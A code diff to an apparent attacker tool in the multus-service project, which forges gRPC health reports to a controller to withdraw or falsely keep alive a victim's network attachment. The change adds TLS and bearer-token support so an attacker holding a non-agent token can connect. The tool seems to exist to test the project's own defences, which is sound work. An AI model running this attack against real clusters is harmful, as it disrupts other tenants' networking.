@@ -29,10 +29,27 @@ import (
 	"time"
 
 	"google.golang.org/grpc"
+	"google.golang.org/grpc/credentials"
 	"google.golang.org/grpc/credentials/insecure"
 
 	healthpb "github.com/boanlab/multus-service/api/healthpb"
 )
+
+// bearer attaches a token file as a bearer credential, for the attacker variant
+// that possesses a valid but non-agent token.
+type bearer struct {
+	path string
+	tls  bool
+}
+
+func (b bearer) GetRequestMetadata(context.Context, ...string) (map[string]string, error) {
+	t, err := os.ReadFile(b.path)
+	if err != nil {
+		return nil, err
+	}
+	return map[string]string{"authorization": "Bearer " + string(t)}, nil
+}
+func (b bearer) RequireTransportSecurity() bool { return b.tls }
 
 func main() {
 	var (
@@ -43,11 +60,15 @@ func main() {
 		iface      = flag.String("interface", "", "victim interface name")
 		ip         = flag.String("ip", "", "victim address")
 		attack     = flag.String("attack", "", "withdraw | keepalive")
+		caPath     = flag.String("ca", "", "controller CA for TLS; empty dials plaintext")
+		serverName = flag.String("server-name", "", "TLS server name to verify")
+		tokenPath  = flag.String("token", "", "bearer token file; empty sends none")
 		duration   = flag.Duration("duration", 30*time.Second, "how long to sustain the attack")
 		sendEvery  = flag.Duration("send-interval", 100*time.Millisecond, "forged report cadence")
 		instanceID = flag.String("instance", "attacker", "instance id base")
 	)
 	flag.Parse()
+	dialCA, dialSN, dialTok = *caPath, *serverName, *tokenPath
 	for name, v := range map[string]string{"addr": *addr, "node": *node, "attachment": *attID,
 		"nad": *nad, "interface": *iface, "ip": *ip, "attack": *attack} {
 		if v == "" {
@@ -101,11 +122,26 @@ func main() {
 }
 
 // session opens one stream and keeps forging until it breaks or ctx ends.
+var dialCA, dialSN, dialTok string
+
 func session(ctx context.Context, addr, node, inst string,
 	local *healthpb.LocalHealth, path *healthpb.PathHealth,
 	every time.Duration, sends, accepted *int) (bool, bool) {
 
-	conn, err := grpc.NewClient(addr, grpc.WithTransportCredentials(insecure.NewCredentials()))
+	var opts []grpc.DialOption
+	if dialCA != "" {
+		tc, err := credentials.NewClientTLSFromFile(dialCA, dialSN)
+		if err != nil {
+			return false, false
+		}
+		opts = append(opts, grpc.WithTransportCredentials(tc))
+	} else {
+		opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
+	}
+	if dialTok != "" {
+		opts = append(opts, grpc.WithPerRPCCredentials(bearer{path: dialTok, tls: dialCA != ""}))
+	}
+	conn, err := grpc.NewClient(addr, opts...)
 	if err != nil {
 		return false, false
 	}
